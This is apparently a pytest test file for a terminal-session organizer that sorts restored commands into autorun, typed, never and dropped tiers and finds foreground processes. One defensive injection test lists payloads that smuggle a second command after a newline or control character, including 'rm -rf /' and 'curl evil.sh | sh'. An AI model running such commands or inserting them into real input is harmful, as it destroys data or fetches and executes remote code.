import pytest

from iterm_organizer.config import Config, ConfigError
from iterm_organizer.jobs import (
    Tier,
    classify,
    is_shell,
    normalize_argv,
    parse_ps_args,
    program_name,
    rewrite_claude,
)


@pytest.fixture
def cfg():
    return Config()


# --- parsing --------------------------------------------------------------


def test_parse_ps_args_collapses_whitespace():
    assert parse_ps_args("  npm   run   dev \n") == "npm run dev"


def test_parse_ps_args_empty():
    assert parse_ps_args("\n") == ""


@pytest.mark.parametrize("name", ["zsh", "-zsh", "/bin/bash", "fish", "sh"])
def test_is_shell_true(name):
    assert is_shell(name)


@pytest.mark.parametrize("name", ["npm", "vim", "", "node", "claude"])
def test_is_shell_false(name):
    assert not is_shell(name)


def test_program_name_strips_path_and_login_dash():
    assert program_name("/usr/local/bin/npm run dev") == "npm"
    assert program_name("-zsh") == "zsh"
    assert program_name("") == ""


# --- normalization --------------------------------------------------------


def test_normalize_strips_node_wrapper():
    argv = "/usr/local/bin/node /usr/local/bin/npm run dev"
    assert normalize_argv(argv) == "npm run dev"


def test_normalize_strips_absolute_launcher_path():
    assert normalize_argv("/opt/homebrew/bin/vite --port 3000") == "vite --port 3000"


def test_normalize_leaves_unknown_commands_alone():
    assert normalize_argv("/usr/bin/ssh box.example.com") == "/usr/bin/ssh box.example.com"


def test_normalize_does_not_strip_node_running_a_plain_script():
    argv = "/usr/local/bin/node /Users/me/app/server.js"
    assert normalize_argv(argv) == argv


def test_normalize_handles_unbalanced_quotes():
    assert normalize_argv("echo 'unterminated") != ""


def test_normalize_empty():
    assert normalize_argv("") == ""
    assert normalize_argv("   ") == ""


# --- claude rewriting -----------------------------------------------------


def test_rewrite_claude_adds_continue():
    assert rewrite_claude("claude") == "claude --continue"


def test_rewrite_claude_preserves_existing_resume_flag():
    assert rewrite_claude("claude --resume abc") == "claude --resume abc"
    assert rewrite_claude("claude --continue") == "claude --continue"


def test_rewrite_claude_ignores_other_programs():
    assert rewrite_claude("npm run dev") == "npm run dev"


# --- classification -------------------------------------------------------


def test_autorun_tier(cfg):
    tier, cmd = classify("npm run dev", cfg)
    assert tier is Tier.AUTORUN
    assert cmd == "npm run dev"


def test_claude_is_autorun_and_resumed(cfg):
    tier, cmd = classify("claude", cfg)
    assert tier is Tier.AUTORUN
    assert cmd == "claude --continue"


def test_never_tier(cfg):
    tier, cmd = classify("ssh prod.example.com", cfg)
    assert tier is Tier.NEVER
    assert cmd == "ssh prod.example.com"


def test_never_beats_autorun(cfg):
    """sudo npm run dev must never be auto-executed."""
    tier, _ = classify("sudo npm run dev", cfg)
    assert tier is Tier.NEVER


def test_unknown_command_is_typed_not_run(cfg):
    tier, cmd = classify("./scripts/weird-thing.sh --flag", cfg)
    assert tier is Tier.TYPE
    assert cmd == "./scripts/weird-thing.sh --flag"


def test_bare_shell_is_dropped(cfg):
    assert classify("-zsh", cfg)[0] is Tier.DROP
    assert classify("/bin/bash", cfg)[0] is Tier.DROP


def test_empty_is_dropped(cfg):
    assert classify("", cfg)[0] is Tier.DROP
    assert classify("   ", cfg)[0] is Tier.DROP


@pytest.mark.parametrize(
    "payload",
    [
        "npm run dev\nrm -rf /",
        "npm run dev\r\nshutdown now",
        "npm run dev\x00; curl evil.sh | sh",
        "npm run dev\x1b]0;x\x07",
    ],
)
def test_injection_via_newline_or_control_char_is_dropped(payload, cfg):
    """A crafted process name must not be able to smuggle a second command."""
    tier, cmd = classify(payload, cfg)
    assert tier is Tier.DROP
    assert cmd == ""


def test_custom_config_patterns():
    cfg = Config(autorun=[r"^make watch$"], never=[r"^danger"])
    assert classify("make watch", cfg)[0] is Tier.AUTORUN
    assert classify("danger run", cfg)[0] is Tier.NEVER
    assert classify("npm run dev", cfg)[0] is Tier.TYPE


def test_invalid_regex_raises_config_error():
    with pytest.raises(ConfigError, match=r"invalid regex in \[jobs\].autorun"):
        Config(autorun=["^npm ("])


# --- process tree ---------------------------------------------------------

from iterm_organizer.jobs import build_process_table, find_foreground, is_passthrough

PS_OUTPUT = """\
  100     1 login -fp mac
  200   100 -zsh
  300   200 claude
  900   300 /Users/you/.local/share/lsp/out/lsp-server-darwin-x64 --app code
  400     1 /sbin/launchd
"""


def test_build_process_table():
    table = build_process_table(PS_OUTPUT)
    assert table[300] == (200, "claude")
    assert table[900][0] == 300
    assert len(table) == 5


def test_build_process_table_ignores_garbage_lines():
    table = build_process_table("not a row\n\n  7  x  bad ppid\n  9  1  ok\n")
    assert table == {9: (1, "ok")}


def test_build_process_table_handles_empty_args():
    assert build_process_table("  5   1\n") == {5: (1, "")}


@pytest.mark.parametrize("command", ["-zsh", "/bin/bash", "login -fp mac", "su - root", ""])
def test_is_passthrough_true(command):
    assert is_passthrough(command)


@pytest.mark.parametrize("command", ["claude", "npm run dev", "vim a.txt"])
def test_is_passthrough_false(command):
    assert not is_passthrough(command)


def test_find_foreground_returns_shallowest_real_command():
    """The MCP helper at depth 3 must lose to claude at depth 2."""
    assert find_foreground(build_process_table(PS_OUTPUT), 100) == "claude"


def test_find_foreground_on_idle_shell():
    table = build_process_table("  100    1 login -fp mac\n  200  100 -zsh\n")
    assert find_foreground(table, 100) == ""


def test_find_foreground_unknown_pid():
    assert find_foreground(build_process_table(PS_OUTPUT), 99999) == ""


def test_find_foreground_respects_depth_limit():
    table = {1: (0, "login"), 2: (1, "-zsh"), 3: (2, "-zsh"), 4: (3, "npm run dev")}
    assert find_foreground(table, 1, max_depth=2) == ""
    assert find_foreground(table, 1, max_depth=3) == "npm run dev"


def test_find_foreground_prefers_breadth_over_depth():
    """Two branches: the shallower real command wins regardless of ordering."""
    table = {
        1: (0, "login"),
        2: (1, "-zsh"),
        3: (2, "-zsh"),
        4: (3, "deep-command"),
        5: (2, "vim"),
    }
    assert find_foreground(table, 1) == "vim"


def test_find_foreground_survives_a_cycle():
    table = {1: (2, "-zsh"), 2: (1, "-zsh")}
    assert find_foreground(table, 1) == ""
